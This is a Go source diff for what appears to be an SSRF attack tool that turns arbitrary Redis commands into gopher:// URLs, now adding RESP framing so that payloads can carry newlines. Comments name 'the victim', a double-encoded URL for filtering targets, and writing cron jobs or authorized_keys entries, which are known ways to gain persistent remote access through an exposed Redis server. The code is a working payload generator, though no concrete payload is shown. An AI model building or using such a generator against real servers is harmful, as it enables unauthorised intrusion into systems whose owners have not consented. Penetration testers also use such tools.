@@ -15,19 +15,23 @@ import (
 	"strings"
 )
 
-// Config describes one encoding run: where Redis lives and what to send.
+// Config describes one encoding run: where Redis lives, what to send and
+// how to frame it. Resp selects RESP multi-bulk framing; the zero value
+// keeps the legacy inline-text framing.
 type Config struct {
 	Host    string
 	Port    int
 	Payload string
+	Resp    bool // frame each command as a RESP array instead of inline text
 }
 
 // Result is the fully encoded output of one run — an immutable snapshot.
 type Result struct {
 	Host     string   // normalised for the URL (IPv6 bracketed)
 	Port     int      // validated port
-	Commands []string // one Redis command per entry
-	Wire     string   // exact bytes Redis receives (every command + CRLF)
+	Commands []string // one Redis command per entry, as typed
+	Framing  string   // "inline" (CRLF text) or "RESP" (multi-bulk arrays)
+	Wire     string   // exact bytes Redis receives
 	Encoded  string   // percent-encoded wire payload
 	URL      string   // final gopher:// URL, single-encoded
 	Double   string   // URL re-encoded, for targets that decode once first
@@ -103,10 +107,11 @@ func validHostname(h string) bool {
 //
 // The encoding flow is a pure composition:
 //
-//	splitCommands → commandsToWire → percentEncode → assembleURL
+//	splitCommands → wire(cmds) → percentEncode → assembleURL
 //
 // each step transforming an immutable value into the next, with encode/1 as
-// the top-level pipeline for one run.
+// the top-level pipeline for one run. wire is commandsToWire (inline CRLF
+// text) or commandsToRESP (multi-bulk arrays), chosen by Config.Resp.
 
 // mapSlice returns a new slice with fn applied to every element of xs.
 func mapSlice[T, U any](xs []T, fn func(T) U) []U {
@@ -147,6 +152,172 @@ func commandsToWire(cmds []string) string {
 	return strings.Join(mapSlice(cmds, appendCRLF), "")
 }
 
+// ---- RESP framing ---------------------------------------------------------
+//
+// Inline text (above) relies on the Redis server to split each line into
+// arguments; a CRLF inside any argument would end the command early. RESP
+// multi-bulk arrays instead prefix every argument with its byte length, so
+// the tool splits arguments client-side and any byte — newlines included —
+// travels safely inside a frame. This is what makes payloads that must
+// carry \n (cron jobs, authorized_keys) possible.
+
+// splitArgs splits one command line into its arguments using the syntax
+// Redis accepts for inline commands, so RESP mode takes the same input as
+// inline mode. Runs of whitespace separate arguments; "double quotes"
+// group text into one argument and decode backslash escapes (\n \r \t
+// \b \a \v \f \\ \" \' and \xHH) into real bytes; 'single quotes' group
+// literally, with \' the only escape. A closing quote must end the
+// argument (Redis enforces the same). Unlike Redis — which passes an
+// unknown escape's character through silently — an unknown escape is
+// rejected: in a tool that turns text into bytes, a silently dropped
+// backslash would corrupt the payload.
+func splitArgs(cmd string) ([]string, error) {
+	var args []string
+	var cur strings.Builder
+	inDQ, inSQ := false, false // inside "double" / 'single' quotes
+	started := false           // an argument is being built
+	for i := 0; i < len(cmd); {
+		c := cmd[i]
+		switch {
+		case inDQ:
+			switch {
+			case c == '\\':
+				b, next, err := dqEscape(cmd, i)
+				if err != nil {
+					return nil, err
+				}
+				cur.WriteByte(b)
+				i = next
+			case c == '"':
+				if i+1 < len(cmd) && !isArgSpace(cmd[i+1]) {
+					return nil, fmt.Errorf("character %q right after a closing \" quote", cmd[i+1])
+				}
+				inDQ = false
+				i++
+			default:
+				cur.WriteByte(c)
+				i++
+			}
+		case inSQ:
+			switch {
+			case c == '\\' && i+1 < len(cmd) && cmd[i+1] == '\'':
+				cur.WriteByte('\'')
+				i += 2
+			case c == '\'':
+				if i+1 < len(cmd) && !isArgSpace(cmd[i+1]) {
+					return nil, fmt.Errorf("character %q right after a closing ' quote", cmd[i+1])
+				}
+				inSQ = false
+				i++
+			default:
+				cur.WriteByte(c)
+				i++
+			}
+		case c == '"':
+			inDQ, started = true, true
+			i++
+		case c == '\'':
+			inSQ, started = true, true
+			i++
+		case c == ' ' || c == '\t':
+			if started {
+				args = append(args, cur.String())
+				cur.Reset()
+				started = false
+			}
+			i++
+		default:
+			cur.WriteByte(c)
+			started = true
+			i++
+		}
+	}
+	if inDQ {
+		return nil, fmt.Errorf("unterminated \" quote")
+	}
+	if inSQ {
+		return nil, fmt.Errorf("unterminated ' quote")
+	}
+	if started {
+		args = append(args, cur.String())
+	}
+	return args, nil
+}
+
+// isArgSpace reports whether c separates arguments.
+func isArgSpace(c byte) bool { return c == ' ' || c == '\t' }
+
+// dqEscape decodes the backslash escape starting at cmd[i] and returns the
+// decoded byte plus the index just past the sequence.
+func dqEscape(cmd string, i int) (byte, int, error) {
+	if i+1 >= len(cmd) {
+		return 0, i, fmt.Errorf("dangling backslash in \" quoted argument")
+	}
+	c := cmd[i+1]
+	if c == 'x' {
+		if i+3 >= len(cmd) || !isHex(cmd[i+2]) || !isHex(cmd[i+3]) {
+			return 0, i, fmt.Errorf("\\x escape needs two hex digits")
+		}
+		v, _ := strconv.ParseUint(cmd[i+2:i+4], 16, 8)
+		return byte(v), i + 4, nil
+	}
+	switch c {
+	case 'n':
+		return '\n', i + 2, nil
+	case 'r':
+		return '\r', i + 2, nil
+	case 't':
+		return '\t', i + 2, nil
+	case 'b':
+		return '\b', i + 2, nil
+	case 'a':
+		return '\a', i + 2, nil
+	case 'v':
+		return '\v', i + 2, nil
+	case 'f':
+		return '\f', i + 2, nil
+	case '\\':
+		return '\\', i + 2, nil
+	case '"':
+		return '"', i + 2, nil
+	case '\'':
+		return '\'', i + 2, nil
+	}
+	return 0, i, fmt.Errorf("unknown escape \\%c in \" quoted argument", c)
+}
+
+// isHex reports whether c is an ASCII hex digit.
+func isHex(c byte) bool {
+	return c >= '0' && c <= '9' || c >= 'a' && c <= 'f' || c >= 'A' && c <= 'F'
+}
+
+// respFrame wraps one argument list in a RESP array: *count then one
+// $len<CRLF>bytes<CRLF> bulk string per argument. Lengths are in bytes,
+// which is exactly what RESP requires after escapes are decoded.
+func respFrame(args []string) string {
+	var b strings.Builder
+	fmt.Fprintf(&b, "*%d\r\n", len(args))
+	for _, a := range args {
+		fmt.Fprintf(&b, "$%d\r\n%s\r\n", len(a), a)
+	}
+	return b.String()
+}
+
+// commandsToRESP folds the commands into back-to-back RESP arrays — valid
+// RESP pipelining, one array per command. A line that cannot be tokenized
+// (unbalanced quotes, broken escape) errors with its command number.
+func commandsToRESP(cmds []string) (string, error) {
+	var b strings.Builder
+	for i, cmd := range cmds {
+		args, err := splitArgs(cmd)
+		if err != nil {
+			return "", fmt.Errorf("command %d: %w", i+1, err)
+		}
+		b.WriteString(respFrame(args))
+	}
+	return b.String(), nil
+}
+
 // percentEncode URL-encodes every byte except ASCII letters and digits.
 // Nothing else survives unencoded: spaces become %20, slashes %2F and the
 // CRLF terminators %0D%0A, so no parser layer between the victim and Redis
@@ -183,7 +354,7 @@ func doubleEncode(url string) string {
 	return percentEncode(url)
 }
 
-// encode runs the whole pipeline for one config: split → CRLF → encode →
+// encode runs the whole pipeline for one config: split → frame → encode →
 // wrap. It returns a Result plus any validation error.
 func encode(cfg Config) (Result, error) {
 	if err := validatePort(cfg.Port); err != nil {
@@ -197,13 +368,23 @@ func encode(cfg Config) (Result, error) {
 	if len(cmds) == 0 {
 		return Result{}, fmt.Errorf("payload has no Redis commands")
 	}
-	wire := commandsToWire(cmds)
+	var wire string
+	framing := "inline"
+	if cfg.Resp {
+		if wire, err = commandsToRESP(cmds); err != nil {
+			return Result{}, err
+		}
+		framing = "RESP"
+	} else {
+		wire = commandsToWire(cmds)
+	}
 	enc := percentEncode(wire)
 	url := assembleURL(host, cfg.Port, enc)
 	return Result{
 		Host:     host,
 		Port:     cfg.Port,
 		Commands: cmds,
+		Framing:  framing,
 		Wire:     wire,
 		Encoded:  enc,
 		URL:      url,
